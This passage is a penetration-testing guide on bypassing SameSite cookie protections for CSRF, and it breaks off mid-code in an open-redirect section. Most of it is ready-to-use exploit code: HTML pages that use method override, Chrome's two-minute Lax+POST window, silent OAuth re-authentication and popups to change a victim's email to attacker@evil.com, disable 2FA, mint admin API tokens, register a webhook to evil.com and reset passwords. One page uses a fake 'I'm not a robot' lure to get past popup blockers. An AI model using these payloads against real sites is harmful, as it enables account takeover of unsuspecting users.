---
title: CSRF with SameSite Bypass Attack & Techniques
description: Advanced exploitation techniques for bypassing SameSite cookie protections in Cross-Site Request Forgery attacks, covering Lax+POST timing windows, top-level navigation abuse, method override chaining, popup window exploitation, WebSocket hijacking, subdomain cookie injection, and browser-specific behavioral quirks for penetration testers.
navigation:
  icon: i-lucide-cookie
  title: CSRF with SameSite Bypass
---

## Understanding SameSite Cookie Mechanics

::note
The `SameSite` cookie attribute is the browser's primary defense against CSRF. It controls whether cookies are sent on cross-site requests. Bypassing SameSite requires understanding same-site vs cross-site definitions, browser-specific implementations, timing windows, and architectural weaknesses in how applications handle navigation, redirects, and protocol-level interactions.
::

### SameSite Attribute Values

| Attribute | Cross-Site POST | Cross-Site GET (Top-Level) | Cross-Site Subresource | iframe | WebSocket |
| --- | --- | --- | --- | --- | --- |
| `SameSite=Strict` | ❌ Blocked | ❌ Blocked | ❌ Blocked | ❌ Blocked | ✅ **Sent** |
| `SameSite=Lax` | ❌ Blocked | ✅ **Sent** | ❌ Blocked | ❌ Blocked | ✅ **Sent** |
| `SameSite=None; Secure` | ✅ Sent | ✅ Sent | ✅ Sent | ✅ Sent | ✅ Sent |
| Not Set (Default) | ❌ Blocked* | ✅ **Sent*** | ❌ Blocked* | ❌ Blocked* | ✅ **Sent** |

::tip
*Modern browsers (Chrome 80+, Edge 80+, Firefox 96+) default to `Lax` behavior when no `SameSite` attribute is explicitly set. However, Chrome applies a 2-minute `Lax+POST` exception for newly set cookies — a critical exploitation window.
::

### Same-Site vs Cross-Site Definition

::card-group
  ::card
  ---
  title: Same-Site
  icon: i-lucide-check-circle
  ---
  Two URLs are **same-site** if they share the same registrable domain (eTLD+1). Protocol and port may differ depending on browser behavior. `sub.target.com` and `other.target.com` are **same-site**. `target.com` and `target.co.uk` are **NOT** same-site.
  ::

  ::card
  ---
  title: Cross-Site
  icon: i-lucide-x-circle
  ---
  Two URLs are **cross-site** if they have different registrable domains. `evil.com` to `target.com` is cross-site. SameSite cookie restrictions apply to these navigations. Key: the **initiating site** determines same-site or cross-site status.
  ::

  ::card
  ---
  title: Schemeful Same-Site
  icon: i-lucide-lock
  ---
  Chrome 89+ treats `http://target.com` and `https://target.com` as **cross-site** (schemeful same-site). This means HTTP→HTTPS navigations are cross-site, blocking Lax cookies on protocol downgrades.
  ::

  ::card
  ---
  title: Public Suffix List
  icon: i-lucide-list
  ---
  The eTLD+1 boundary is defined by the [Public Suffix List](https://publicsuffix.org/). `github.io`, `herokuapp.com`, `azurewebsites.net` are public suffixes — meaning `a.github.io` and `b.github.io` are **cross-site**, not same-site.
  ::
::

## Reconnaissance & SameSite Analysis

### Cookie Attribute Enumeration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="cURL Cookie Analysis"}
  ```bash
  # Comprehensive cookie attribute extraction
  curl -sI https://target.com/login -X POST \
    -d "user=test&pass=test" 2>&1 | \
    grep -i "set-cookie" | \
    while IFS= read -r line; do
      cookie_name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
      value=$(echo "$line" | grep -oP 'Set-Cookie:\s*[^=]+=\K[^;]+')
      samesite=$(echo "$line" | grep -ioP 'samesite=\K\w+' || echo "NOT SET")
      secure=$(echo "$line" | grep -qi "secure" && echo "Yes" || echo "No")
      httponly=$(echo "$line" | grep -qi "httponly" && echo "Yes" || echo "No")
      domain=$(echo "$line" | grep -ioP 'domain=\K[^;]+' || echo "origin only")
      path=$(echo "$line" | grep -ioP 'path=\K[^;]+' || echo "/")
      maxage=$(echo "$line" | grep -ioP 'max-age=\K[^;]+' || echo "session")
      expires=$(echo "$line" | grep -ioP 'expires=\K[^;]+' || echo "none")
      
      echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      echo "Cookie:    $cookie_name"
      echo "SameSite:  $samesite"
      echo "Secure:    $secure"
      echo "HttpOnly:  $httponly"
      echo "Domain:    $domain"
      echo "Path:      $path"
      echo "Max-Age:   $maxage"
      echo "Expires:   $expires"
      
      # SameSite bypass assessment
      case $(echo "$samesite" | tr '[:upper:]' '[:lower:]') in
        "strict")
          echo "Attack:    WebSocket CSRF, same-site gadgets, client-side redirect"
          ;;
        "lax")
          echo "Attack:    Top-level GET + method override, popup window, 2-min POST window"
          ;;
        "none")
          if [ "$secure" = "No" ]; then
            echo "Attack:    SameSite=None without Secure flag → cookie ignored by browsers"
          else
            echo "Attack:    Full cross-site CSRF possible (no SameSite protection)"
          fi
          ;;
        "not set")
          echo "Attack:    Browser defaults to Lax → GET + method override, 2-min POST window"
          ;;
      esac
      echo ""
    done

  # Quick one-liner for SameSite status
  curl -sI https://target.com/ | grep -i "set-cookie" | \
    sed 's/.*Set-Cookie: \([^=]*\).*/\1/' | \
    while read name; do
      ss=$(curl -sI https://target.com/ | grep -i "set-cookie.*$name" | grep -ioP 'samesite=\K\w+' || echo "DEFAULT(Lax)")
      echo "$name → SameSite=$ss"
    done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Browser DevTools Analysis"}
  ```bash
  # Chrome DevTools commands for cookie analysis
  # Open: F12 → Application → Cookies → target domain

  # JavaScript console commands to inspect cookies:

  # List all cookies with attributes (requires non-HttpOnly)
  # Run in browser console on target.com:
  document.cookie.split(';').forEach(c => console.log(c.trim()));

  # Use Cookie Store API (Chrome 87+):
  # await cookieStore.getAll()
  # Returns: [{name, value, domain, path, expires, secure, sameSite}]

  # Puppeteer script for comprehensive cookie analysis
  cat > cookie_analyzer.js << 'EOF'
  const puppeteer = require('puppeteer');
  
  (async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    
    // Navigate and capture Set-Cookie headers
    const cookies_from_headers = [];
    page.on('response', async (response) => {
      const headers = response.headers();
      const setCookies = headers['set-cookie'];
      if (setCookies) {
        cookies_from_headers.push({
          url: response.url(),
          cookies: setCookies
        });
      }
    });
    
    await page.goto('https://target.com/', { waitUntil: 'networkidle2' });
    
    // Get all cookies from browser
    const cookies = await page.cookies();
    
    console.log('\n=== Browser Cookie Store ===');
    cookies.forEach(c => {
      console.log(`\nCookie: ${c.name}`);
      console.log(`  SameSite: ${c.sameSite || 'unspecified (defaults to Lax)'}`);
      console.log(`  Secure:   ${c.secure}`);
      console.log(`  HttpOnly: ${c.httpOnly}`);
      console.log(`  Domain:   ${c.domain}`);
      console.log(`  Path:     ${c.path}`);
      console.log(`  Expires:  ${c.expires === -1 ? 'Session' : new Date(c.expires * 1000)}`);
    });
    
    console.log('\n=== Set-Cookie Headers ===');
    cookies_from_headers.forEach(h => {
      console.log(`\nFrom: ${h.url}`);
      console.log(`  ${h.cookies}`);
    });
    
    await browser.close();
  })();
  EOF
  node cookie_analyzer.js
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Automated Multi-Page Scan"}
  ```bash
  #!/bin/bash
  # Scan multiple pages/endpoints for cookie SameSite configuration

  TARGET="https://target.com"
  PAGES=(
    "/" "/login" "/api/session" "/dashboard"
    "/settings" "/profile" "/api/csrf-token"
    "/oauth/authorize" "/api/user" "/admin"
  )

  echo "=== SameSite Cookie Audit: $TARGET ==="
  echo ""

  declare -A cookie_map

  for page in "${PAGES[@]}"; do
    cookies=$(curl -sI "${TARGET}${page}" 2>/dev/null | grep -i "set-cookie")
    if [ -n "$cookies" ]; then
      while IFS= read -r line; do
        name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
        ss=$(echo "$line" | grep -ioP 'samesite=\K\w+' || echo "NOT_SET")
        secure=$(echo "$line" | grep -qi "secure" && echo "S" || echo "-")
        httponly=$(echo "$line" | grep -qi "httponly" && echo "H" || echo "-")
        
        key="${name}"
        if [ -z "${cookie_map[$key]}" ]; then
          cookie_map[$key]="SameSite=${ss} Secure=${secure} HttpOnly=${httponly} (from ${page})"
          echo "[$secure$httponly] $name: SameSite=$ss (found on $page)"
        fi
      done <<< "$cookies"
    fi
  done

  echo ""
  echo "=== Bypass Assessment ==="
  for key in "${!cookie_map[@]}"; do
    info="${cookie_map[$key]}"
    ss=$(echo "$info" | grep -oP 'SameSite=\K\w+')
    
    case $(echo "$ss" | tr '[:upper:]' '[:lower:]') in
      "strict")
        echo "[HARD] $key: Strict → Requires same-site gadget or WebSocket"
        ;;
      "lax")
        echo "[MEDIUM] $key: Lax → Top-level GET navigation + method override"
        ;;
      "none")
        echo "[EASY] $key: None → Full cross-site CSRF (if Secure flag present)"
        ;;
      "not_set")
        echo "[MEDIUM] $key: Default(Lax) → GET navigation + 2-min POST window"
        ;;
    esac
  done
  ```
  :::
::

### Cross-Site vs Same-Site Verification

::accordion
  :::accordion-item{icon="i-lucide-search" label="Determine Site Boundary (eTLD+1)"}
  ```bash
  # Identify the registrable domain (eTLD+1) for the target
  # This determines which origins are "same-site"

  # Method 1: Using publicsuffix library
  python3 -c "
  import tldextract
  
  domains = [
    'target.com',
    'app.target.com',
    'api.target.com',
    'blog.target.com',
    'cdn.target.com',
    'evil.com',
    'target.co.uk',
    'target.com.evil.com',
  ]
  
  for d in domains:
    ext = tldextract.extract(d)
    etld1 = f'{ext.domain}.{ext.suffix}'
    print(f'{d:30} → eTLD+1: {etld1:20} → Same-site with target.com: {etld1 == \"target.com\"}')
  "

  # Method 2: Manual check using Public Suffix List
  # Download PSL
  curl -s https://publicsuffix.org/list/public_suffix_list.dat | head -50

  # Key insight: these are PUBLIC SUFFIXES (each subdomain is a separate site)
  # github.io, herokuapp.com, azurewebsites.net, pages.dev
  # netlify.app, vercel.app, firebaseapp.com, appspot.com

  # So: attacker.github.io and victim.github.io are CROSS-SITE
  # But: attacker.target.com and victim.target.com are SAME-SITE

  # Method 3: Check if target uses a public suffix domain
  TARGET="target.com"
  curl -s https://publicsuffix.org/list/public_suffix_list.dat | \
    grep -i "$(echo $TARGET | rev | cut -d. -f1-2 | rev)"
  ```
  :::

  :::accordion-item{icon="i-lucide-search" label="Enumerate Same-Site Origins"}
  ```bash
  # Find all subdomains that are same-site with the target
  # These can be used as launching points for CSRF

  # Subdomain enumeration
  subfinder -d target.com -silent | tee same_site_origins.txt
  amass enum -passive -d target.com | tee -a same_site_origins.txt
  sort -u same_site_origins.txt -o same_site_origins.txt

  echo "[+] Found $(wc -l < same_site_origins.txt) same-site origins"

  # Check which subdomains are alive
  cat same_site_origins.txt | httpx -silent -status-code | tee alive_samesites.txt

  # Check for XSS on same-site origins (critical for Strict bypass)
  cat alive_samesites.txt | awk '{print $1}' | nuclei -t xss/ -silent

  # Check for open redirects on same-site origins
  cat alive_samesites.txt | awk '{print $1}' | \
    while read url; do
      redir=$(curl -s -o /dev/null -w "%{redirect_url}" \
        "${url}/redirect?url=https://evil.com" 2>/dev/null)
      if echo "$redir" | grep -q "evil.com"; then
        echo "[+] Open redirect: ${url}/redirect?url="
      fi
    done

  # Check for subdomain takeover
  subjack -w same_site_origins.txt -t 50 -timeout 30 -ssl \
    -c /usr/share/subjack/fingerprints.json -v

  # Check for file upload functionality (can host exploit pages)
  cat alive_samesites.txt | awk '{print $1}' | \
    while read url; do
      status=$(curl -s -o /dev/null -w "%{http_code}" "${url}/upload" 2>/dev/null)
      if [ "$status" != "404" ]; then
        echo "[+] Upload endpoint: ${url}/upload (HTTP $status)"
      fi
    done
  ```
  :::

  :::accordion-item{icon="i-lucide-search" label="Schemeful Same-Site Testing"}
  ```bash
  # Chrome 89+ treats HTTP and HTTPS as cross-site (schemeful same-site)
  # Test if target serves content over both HTTP and HTTPS

  # Check HTTP availability
  curl -sI http://target.com/ -o /dev/null -w "HTTP: %{http_code} → %{redirect_url}\n"
  curl -sI https://target.com/ -o /dev/null -w "HTTPS: %{http_code}\n"

  # Check if HSTS is enforced
  curl -sI https://target.com/ | grep -i "strict-transport-security"

  # Check subdomains for HTTP access
  cat same_site_origins.txt | while read domain; do
    http_status=$(curl -s -o /dev/null -w "%{http_code}" "http://${domain}/" --max-time 5 2>/dev/null)
    if [ "$http_status" != "000" ] && [ "$http_status" != "301" ] && [ "$http_status" != "302" ]; then
      echo "[+] HTTP available (no redirect): http://${domain}/ (HTTP $http_status)"
    fi
  done

  # Schemeful same-site implications:
  # If target only serves HTTPS with HSTS → HTTP downgrade not feasible
  # If HTTP is accessible → In Chrome, http://target.com is CROSS-SITE to https://target.com
  # In Firefox/Safari → May still treat as same-site (implementation varies)
  ```
  :::
::

## SameSite=Lax Bypass Techniques

::warning
`SameSite=Lax` is the default in modern browsers and blocks cross-site POST requests. However, it **allows** cookies on top-level GET navigations. The following techniques exploit this allowance through method override, timing windows, popup windows, and same-site gadgets.
::

### Top-Level GET Navigation + Method Override

::tip
`SameSite=Lax` permits cookies on **top-level navigations** using **safe HTTP methods** (GET, HEAD). If the server accepts method override parameters, a GET request can trigger POST-like actions while cookies are included.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Query Parameter Method Override"}
  ```html
  <!-- SameSite=Lax allows cookies on top-level GET navigations -->
  <!-- Combine with server-side method override to perform POST actions -->

  <!-- Technique 1: _method parameter (Rails, Laravel, Django) -->
  <html>
  <body>
  <script>
  // Top-level navigation → browser sends Lax cookies
  window.location = 'https://target.com/api/user/email?_method=POST&email=attacker@evil.com';
  </script>
  </body>
  </html>

  <!-- Technique 2: method parameter -->
  <script>
  window.location = 'https://target.com/api/user/email?method=POST&email=attacker@evil.com';
  </script>

  <!-- Technique 3: X-HTTP-Method-Override in URL -->
  <script>
  window.location = 'https://target.com/api/user/email?X-HTTP-Method-Override=POST&email=attacker@evil.com';
  </script>

  <!-- Technique 4: _METHOD parameter (case variations) -->
  <script>
  window.location = 'https://target.com/api/user/email?_METHOD=PUT&email=attacker@evil.com';
  </script>

  <!-- Technique 5: httpMethod parameter -->
  <script>
  window.location = 'https://target.com/api/user/email?httpMethod=POST&email=attacker@evil.com';
  </script>

  <!-- Technique 6: Anchor tag click (top-level navigation) -->
  <a href="https://target.com/api/user/email?_method=POST&email=attacker@evil.com" id="go">Click</a>
  <script>document.getElementById('go').click();</script>

  <!-- Technique 7: Meta refresh (top-level) -->
  <meta http-equiv="refresh" content="0;url=https://target.com/api/user/email?_method=POST&email=attacker@evil.com">

  <!-- Technique 8: Form GET submission (top-level) -->
  <form action="https://target.com/api/user/email" method="GET">
    <input name="_method" value="POST" type="hidden">
    <input name="email" value="attacker@evil.com" type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Detecting Method Override Support"}
  ```bash
  # Test which method override parameters the server accepts

  OVERRIDE_PARAMS=(
    "_method"
    "method"
    "_METHOD"
    "X-HTTP-Method"
    "X-HTTP-Method-Override"
    "X-Method-Override"
    "_HttpMethod"
    "httpMethod"
    "__method"
    "REQUEST_METHOD"
  )

  METHODS=("POST" "PUT" "PATCH" "DELETE")

  echo "[*] Testing method override parameters on target"
  echo ""

  for param in "${OVERRIDE_PARAMS[@]}"; do
    for method in "${METHODS[@]}"; do
      # Test via query parameter on GET request
      status=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/api/user/profile?${param}=${method}&test=probe" \
        -H "Cookie: session=VALID" \
        --max-time 10)
      
      # Compare with actual GET response
      get_status=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/api/user/profile" \
        -H "Cookie: session=VALID" \
        --max-time 10)
      
      if [ "$status" != "$get_status" ] && [[ "$status" =~ ^(200|201|204|302|400|422)$ ]]; then
        echo "[+] OVERRIDE WORKS: ?${param}=${method} → HTTP $status (GET=$get_status)"
      fi
    done
  done

  # Test method override via request headers (requires preflight for custom headers)
  echo ""
  echo "[*] Testing method override headers (for same-site scenarios)"
  for header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
    for method in "POST" "PUT" "DELETE"; do
      status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X GET "https://target.com/api/user/profile" \
        -H "${header}: ${method}" \
        -H "Cookie: session=VALID")
      echo "Header ${header}: ${method} → HTTP $status"
    done
  done

  # Test if GET request can trigger state changes directly
  echo ""
  echo "[*] Testing state-changing GET endpoints"
  GET_ACTIONS=(
    "/api/user/delete?confirm=true"
    "/api/user/update?email=attacker@evil.com"
    "/api/settings?notifications=off"
    "/api/user/role?role=admin"
    "/api/logout"
    "/api/token/revoke"
    "/api/account/deactivate"
  )

  for action in "${GET_ACTIONS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${action}" \
      -H "Cookie: session=VALID")
    if [[ "$status" =~ ^(200|201|204|302)$ ]]; then
      echo "[!] State change via GET: $action → HTTP $status"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="GET-Based JSON Parameter Injection"}
  ```html
  <!-- Some frameworks parse JSON from GET query parameters -->
  <!-- Express: req.query can be manipulated to create nested objects -->

  <!-- qs library nested object creation via GET -->
  <script>
  // Express/qs: user[email]=evil → {user:{email:"evil"}}
  window.location = 'https://target.com/api/update?' +
    'user[email]=attacker@evil.com&' +
    'user[role]=admin&' +
    '_method=PUT';
  </script>

  <!-- Array injection via GET -->
  <script>
  window.location = 'https://target.com/api/bulk-update?' +
    'ids[]=1&ids[]=2&ids[]=3&' +
    'action=delete&' +
    '_method=POST';
  </script>

  <!-- PHP array parameter injection -->
  <script>
  window.location = 'https://target.com/api/update.php?' +
    'data[email]=attacker@evil.com&' +
    'data[is_admin]=1&' +
    '_method=POST';
  </script>

  <!-- Rails strong parameters via GET -->
  <script>
  window.location = 'https://target.com/users/1?' +
    'user[email]=attacker@evil.com&' +
    'user[role]=admin&' +
    '_method=patch';
  </script>
  ```
  :::
::

### Chrome Lax+POST 2-Minute Window

::caution
Chrome applies a **2-minute exception** to the `SameSite=Lax` default: cookies set without an explicit `SameSite` attribute allow cross-site POST requests for **120 seconds** after the cookie is created. This is Chrome's backward-compatibility mechanism and represents a critical exploitation window.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Basic 2-Minute Window Exploit"}
  ```html
  <!-- Exploit Chrome's Lax+POST 2-minute exception -->
  <!-- Step 1: Force victim to re-authenticate (sets new cookie) -->
  <!-- Step 2: Submit POST CSRF within 2 minutes -->

  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <h2>Loading content...</h2>

  <script>
  // Phase 1: Force new session cookie creation
  // Option A: Open login page (SSO/OAuth auto-login)
  var authWin = window.open('https://target.com/auth/login?prompt=none', '_blank',
    'width=100,height=100,left=-1000,top=-1000');

  // Phase 2: Wait for authentication to complete, then CSRF
  setTimeout(function() {
    // Close auth window
    if (authWin) try { authWin.close(); } catch(e) {}
    
    // POST CSRF within 2-minute Lax+POST window
    // New session cookie was just set → POST allowed cross-site
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/api/user/email';
    form.enctype = 'text/plain';
    form.style.display = 'none';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = '{"email":"attacker@evil.com","p":"';
    input.value = '"}';
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
  }, 5000); // 5 seconds delay for auth to complete
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="OAuth/SSO Re-Authentication Trigger"}
  ```html
  <!-- OAuth flows that silently re-authenticate create new session cookies -->
  <!-- These new cookies are subject to the 2-minute Lax+POST exception -->

  <html>
  <body>
  <script>
  async function exploitLaxPOSTWindow() {
    // Technique 1: OAuth silent re-auth
    // Opens OAuth provider login that auto-approves (already consented)
    // Redirects back to target.com/callback → new session cookie set
    const authUrl = 'https://target.com/oauth/authorize?' +
      'client_id=LEGIT_CLIENT_ID&' +
      'response_type=code&' +
      'redirect_uri=https://target.com/oauth/callback&' +
      'scope=openid&' +
      'prompt=none';  // Silent auth, no user interaction
    
    // Open in popup to avoid losing attacker page
    const popup = window.open(authUrl, 'auth', 'width=1,height=1');
    
    // Wait for auth flow to complete
    await new Promise(resolve => setTimeout(resolve, 4000));
    
    try { popup.close(); } catch(e) {}
    
    // Phase 2: CSRF within 2-minute window
    // New session cookie was just set by OAuth callback
    
    // Attack 1: Change email
    submitCSRF('https://target.com/api/user/email',
      '{"email":"attacker@evil.com","p":"="}');
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Attack 2: Create API token
    submitCSRF('https://target.com/api/tokens',
      '{"name":"svc","scope":"admin","p":"="}');
  }

  function submitCSRF(url, body) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'text/plain';
    form.target = '_blank'; // New window = top-level navigation
    form.style.display = 'none';
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = body.split('="')[0];
    input.value = body.split('="').slice(1).join('="');
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
  }

  exploitLaxPOSTWindow();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Cookie Refresh via Navigation"}
  ```html
  <!-- Some applications refresh/rotate session cookies on each request -->
  <!-- This creates a continuous Lax+POST window -->

  <html>
  <body>
  <script>
  // Technique 1: Navigate to target in hidden iframe to trigger cookie refresh
  // Note: iframe navigation doesn't count as "top-level" for Lax
  // But if target sets new cookie via Set-Cookie on iframe load...
  // That new cookie has 2-minute Lax+POST grace period

  // Actually need top-level navigation for cookie refresh
  // Technique 2: window.open for top-level navigation
  
  async function refreshAndAttack() {
    // Step 1: Top-level navigation to refresh cookies
    // This navigates the current page briefly, then comes back
    
    // Use history.pushState to save our state
    const returnUrl = window.location.href;
    
    // Navigate to target to refresh cookies
    // Use a page that immediately redirects back
    // If target has an open redirect: /redirect?url=ATTACKER_PAGE
    window.location = 'https://target.com/api/ping';
    // Cookie refreshed → 2-minute window starts
    
    // Problem: we lose control of the page
    // Solution: Use popup approach instead
  }

  // Better approach: Popup-based cookie refresh
  async function popupRefreshAttack() {
    // Open target in popup to trigger cookie refresh
    const w = window.open('https://target.com/', '_blank', 
      'width=100,height=100');
    
    // Wait for cookie refresh
    await new Promise(r => setTimeout(r, 3000));
    try { w.close(); } catch(e) {}
    
    // Now submit CSRF POST
    // New cookie from popup page load → Lax+POST window active
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/api/user/email';
    form.enctype = 'text/plain';
    
    const input = document.createElement('input');
    input.name = '{"email":"attacker@evil.com","p":"';
    input.value = '"}';
    input.type = 'hidden';
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
  }
  
  popupRefreshAttack();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Identify 2-Minute Window Candidates"}
  ```bash
  # Check if target cookies are set without explicit SameSite attribute
  # Only cookies WITHOUT SameSite attribute are subject to the 2-min window
  # Cookies WITH SameSite=Lax explicitly set do NOT have the 2-min exception

  curl -sI https://target.com/ | grep -i "set-cookie" | \
    while IFS= read -r line; do
      name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
      has_samesite=$(echo "$line" | grep -qi "samesite" && echo "EXPLICIT" || echo "DEFAULT")
      
      if [ "$has_samesite" = "DEFAULT" ]; then
        echo "[!] $name: No SameSite set → Subject to 2-minute Lax+POST window"
      else
        ss=$(echo "$line" | grep -ioP 'samesite=\K\w+')
        echo "[-] $name: SameSite=$ss (explicitly set, no 2-min window)"
      fi
    done

  # Check if target has OAuth/SSO that triggers silent re-auth
  echo ""
  echo "[*] Checking for silent re-authentication endpoints..."
  
  SSO_ENDPOINTS=(
    "/oauth/authorize?prompt=none"
    "/auth/login?silent=true"
    "/sso/login?passive=true"
    "/.auth/login/aad?prompt=none"
    "/authorize?prompt=none&response_type=code"
  )

  for ep in "${SSO_ENDPOINTS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${ep}" \
      -H "Cookie: session=VALID" --max-time 10)
    if [[ "$status" =~ ^(200|302|303)$ ]]; then
      echo "[+] Silent auth possible: $ep (HTTP $status)"
    fi
  done
  ```
  :::
::

### Popup Window Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="window.open POST CSRF"}
  ```html
  <!-- window.open creates a new top-level browsing context -->
  <!-- Form submissions targeting a popup ARE top-level navigations -->
  <!-- Some browser versions treat popup POST as top-level → Lax cookies sent -->

  <html>
  <body>
  <script>
  function csrfViaPopup() {
    // Method 1: Open popup with form submission
    var popup = window.open('about:blank', 'csrf_win', 'width=1,height=1');
    
    // Write CSRF form into popup
    popup.document.write(`
      <html>
      <body>
      <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
        <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
      </form>
      <script>document.forms[0].submit();<\/script>
      </body>
      </html>
    `);
    popup.document.close();
    
    // Close popup after submission
    setTimeout(() => { try { popup.close(); } catch(e) {} }, 3000);
  }

  // Method 2: Form target="_blank" (opens new window/tab)
  function csrfViaFormTarget() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/api/user/email';
    form.enctype = 'text/plain';
    form.target = '_blank'; // Opens in new tab → top-level context
    form.style.display = 'none';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = '{"email":"attacker@evil.com","p":"';
    input.value = '"}';
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
  }

  // Method 3: Named window target
  function csrfViaNamedWindow() {
    // Pre-open a named window
    window.open('about:blank', 'csrf_target');
    
    // Submit form targeting the named window
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/api/user/email';
    form.enctype = 'text/plain';
    form.target = 'csrf_target';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = '{"email":"attacker@evil.com","p":"';
    input.value = '"}';
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
  }

  csrfViaPopup();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Chained Popup Attacks"}
  ```html
  <!-- Multiple popup windows for parallel or sequential CSRF -->

  <html>
  <body>
  <script>
  async function chainedPopupCSRF() {
    const attacks = [
      {
        url: 'https://target.com/api/user/email',
        body: '{"email":"attacker@evil.com","p":"="}'
      },
      {
        url: 'https://target.com/api/user/2fa/disable',
        body: '{"confirm":true,"p":"="}'
      },
      {
        url: 'https://target.com/api/tokens',
        body: '{"name":"svc","scope":"admin","p":"="}'
      },
      {
        url: 'https://target.com/api/webhooks',
        body: '{"url":"https://evil.com/hook","events":["*"],"p":"="}'
      },
      {
        url: 'https://target.com/api/user/password',
        body: '{"new_password":"Pwned!2024","p":"="}'
      }
    ];

    for (let i = 0; i < attacks.length; i++) {
      const attack = attacks[i];
      
      // Create popup for each attack
      const popup = window.open('about:blank', `csrf_${i}`, 'width=1,height=1');
      
      const nameVal = attack.body.split('="')[0];
      const valVal = attack.body.split('="').slice(1).join('="');
      
      popup.document.write(`
        <form action="${attack.url}" method="POST" enctype="text/plain">
          <input name='${nameVal}' value='${valVal}' type="hidden">
        </form>
        <script>document.forms[0].submit();<\/script>
      `);
      popup.document.close();
      
      // Stagger attacks to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 800));
      
      // Close popup
      try { popup.close(); } catch(e) {}
    }
    
    // Redirect attacker page after attacks complete
    setTimeout(() => {
      window.location.href = 'https://evil.com/success';
    }, 2000);
  }

  // Trigger on user interaction (required for popups in most browsers)
  document.addEventListener('click', function() {
    chainedPopupCSRF();
  });
  </script>

  <div style="width:100vw;height:100vh;cursor:pointer;display:flex;align-items:center;justify-content:center;">
    <h1>Click anywhere to continue</h1>
  </div>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Popup Blocker Bypass"}
  ```html
  <!-- Modern browsers block popups not triggered by user interaction -->
  <!-- These techniques require or simulate user interaction -->

  <html>
  <body>

  <!-- Technique 1: Button click triggers popup (legitimate interaction) -->
  <button id="btn" style="font-size:20px;padding:20px 40px;cursor:pointer"
    onclick="executeCSRF()">
    🔒 Verify Your Identity
  </button>

  <!-- Technique 2: Overlay entire page to capture any click -->
  <div id="overlay" onclick="executeCSRF()" style="
    position:fixed;top:0;left:0;width:100vw;height:100vh;
    cursor:pointer;z-index:9999;background:transparent;">
  </div>

  <!-- Technique 3: Fake CAPTCHA / interaction requirement -->
  <div style="text-align:center;margin-top:100px;">
    <h2>Please verify you're human</h2>
    <div onclick="executeCSRF()" style="
      display:inline-block;padding:15px 30px;
      background:#4CAF50;color:white;border-radius:4px;
      cursor:pointer;font-size:18px;">
      ✓ I'm not a robot
    </div>
  </div>

  <script>
  let executed = false;
  function executeCSRF() {
    if (executed) return;
    executed = true;
    
    // User clicked → popup allowed
    const popup = window.open('about:blank', 'csrf', 'width=1,height=1');
    
    popup.document.write(`
      <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
        <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
      </form>
      <script>document.forms[0].submit();<\/script>
    `);
    popup.document.close();
    
    // Remove overlay
    document.getElementById('overlay')?.remove();
    
    setTimeout(() => {
      try { popup.close(); } catch(e) {}
      document.body.innerHTML = '<h2>✓ Verification complete. Redirecting...</h2>';
      setTimeout(() => window.location = 'https://target.com/', 2000);
    }, 2000);
  }
  </script>
  </body>
  </html>
  ```
  :::
::

### Client-Side Redirect Exploitation

::tip
If the target application or any same-site origin has an **open redirect** or **client-side redirect**, it can be chained to convert a cross-site navigation into a same-site one. The redirect makes the final request originate from the target's site, bypassing SameSite=Lax for POST.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Open Redirect → CSRF Chain"}
  ```html
  <!-- Open redirect on target converts cross-site → same-site navigation -->
  <!-- Browser sees final navigation as originating from target.com -->

  <!-- Scenario: target.com/redirect?url= has open redirect -->

  <!-- Technique 1: GET CSRF via redirect chain -->
  <script>
  // Step 1: Navigate to target's redirect endpoint
